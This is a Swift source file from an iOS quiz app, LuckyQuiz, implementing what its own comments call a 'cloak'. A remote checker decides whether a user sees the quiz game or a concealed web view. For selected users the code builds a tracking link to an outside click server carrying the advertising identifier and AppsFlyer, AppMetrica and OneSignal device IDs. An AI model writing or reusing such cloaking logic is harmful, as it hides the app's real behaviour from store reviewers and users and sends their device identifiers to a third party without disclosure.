//
//  NewLogic.swift
//  LuckyQuiz
//
//  Created by Mark Vais on 11.11.2020.
//  Copyright © 2020 Mark Vais. All rights reserved.
//

import Foundation
import OneSignal
import AdSupport
import YandexMobileMetrica
import AppsFlyerLib

class NewLogic {
    
    var media_sources = [MediaSources]()
    var organic: OrganicData?
    var whatToShow: (deeplink: String, naming: String)?
    var version: String?
    
    //MARK: - parse jsonData from checker api
    func getDataFromChecker (url: URL, completion: @escaping (Responce?) -> Void) {
        
        URLSession.shared.dataTask(with: url) { data, _, error in
            
            guard let jsonData = data else {
                print("Error getting jsonData")
                completion(nil)
                return
            }
            
            do {
                let decodedData = try JSONDecoder().decode(Responce.self, from: jsonData)
                completion(decodedData)
            }
            catch {
                print(error)
                completion(nil)
            }
        }.resume()
    }
    
    func checkerDataUsage(completion: @escaping (String) -> ()) {
        
        let url = URL(string: "https://integr-testing.site/apps_v2/checker/?bundle=com.gb.luckyquizz")!
        
        getDataFromChecker(url: url) { result in
            
            guard let res = result else {
                print("Cloak result is nil")
                return
            }
            
            self.media_sources = res.media_sources
            self.organic = res.organic
            self.version = res.integration_version
            
            let toShow: (String, String) = (res.deeplink, res.naming)
            self.whatToShow = toShow
            
            completion(res.user)
        }
    }
    
    //MARK: - deeplink/naming/organic logic
    func requestData() {
        
        // 1 - make cloak request
        checkerDataUsage() { [self] status in
            
            print("\nUser - \(status)\n")
            
            // 2 - check user from cloak (true - show web, false - show game) // for game testing
            if status != "true" {
                UserDefaults.standard.set("false", forKey: "SHOW_WEB")
                print("User not true - showing game")
                return
            }
            
            UserDefaults.standard.set("true", forKey: "SHOW_WEB")
            print("User true - showing web")
            
            // 3 - user == "true" - check deeplink
            let deep = "\(UserDefaults.standard.object(forKey: "deeplink") ?? "")"
            
            DeeplinkParser().getDataFromDeeplink(deeplink: deep) { deeplinkData -> () in
                
                if deeplinkData != nil && whatToShow?.deeplink == "true" { // check value of deeplink in cloak
                    print("Deeplink data - \(deeplinkData!)")
                    formLinkFromResult(deeplinkData!, status)
                    return
                }
                
                // 4 - no deeplink - check naming
                NamingParser().getDataFromNaming(mediaSources: media_sources) { namingData -> () in
                    
                    if namingData != nil && whatToShow?.naming == "true" {
                        print("Naming data - \(namingData!)")
                        formLinkFromResult(namingData!, status)
                        return
                    }
                    
                    // 5 - no naming - create organic from cloak
                    if (self.organic?.org_status == "true") {
                        
                        let key = self.organic?.org_key ?? Consts.ORGANIC_FB
                        let sub1 = self.organic?.sub1 ?? "none"
                        let sub2 = self.organic?.sub2 ?? "none"
                        let sub3 = self.organic?.sub3 ?? "none"
                        
                        let organicData = ResultData(key: key, sub1: sub1, sub2: sub2, sub3: sub3, source: "none")
                        print("Organic data - \(organicData)")
                        formLinkFromResult(organicData, status)
                    }
                    
                    // 6 - no organic cloak - show game
                    UserDefaults.standard.set("false", forKey: "SHOW_WEB")
                    print("No organic cloak - showing game")
                }
            }
        }
    }
    
    func formLinkFromResult(_ data: ResultData, _ status: String) {
        
        // create link from passed params
        var link = "https://egame.site/click.php"
        
        // neccessary params
        let key = data.key
        link.append("?key=\(key)")
        print(link)
        
        let sub1 = data.sub1
        link.append("&sub1=\(sub1)")
        print(link)
        
        // optional params
        if data.sub2 != nil && data.sub2 != "" {
            let sub2 = data.sub2
            link.append("&sub2=\(sub2!)")
            print(link)
        }
        
        if data.sub3 != nil && data.sub3 != "" {
            let sub3 = data.sub3
            link.append("&sub3=\(sub3!)")
            print(link)
        }
        
        // sub 4 5 
        let bundle = Bundle.main.bundleIdentifier ?? "com.gb.luckyquizz"
        
        var metrica_id = ""
        YMMYandexMetrica.requestAppMetricaDeviceID(withCompletionQueue: DispatchQueue(label: "q")) { (str, error) in
            metrica_id = str ?? "none"
        }
        
        let appsFlyerId = AppsFlyerTracker().getAppsFlyerUID()
        
        let ifa = ASIdentifierManager.shared().advertisingIdentifier
        
        let onesignal_id = OneSignal.getUserDevice()?.getUserId() ?? "none"
        
        let source = data.source
        
        if version == "v1" {
            link.append("&sub4=\(bundle)")

            let sub5 = "\(source):\(ifa):\(appsFlyerId):\(metrica_id)"
            link.append("&sub5=\(sub5)")
            print(link)
            
        } else {
            link.append("&bundle=\(bundle)")
            
            link.append("&metrica_id=\(metrica_id)")

            link.append("&apps_id=\(appsFlyerId)")

            link.append("&ifa=\(ifa)")

            link.append("&onesignal_id=\(onesignal_id)")

            link.append("&source=\(source)")
            
            print(link)
        }
        
        UserDefaults.standard.set(link, forKey: "AGREEMENT_URL")
    }
}
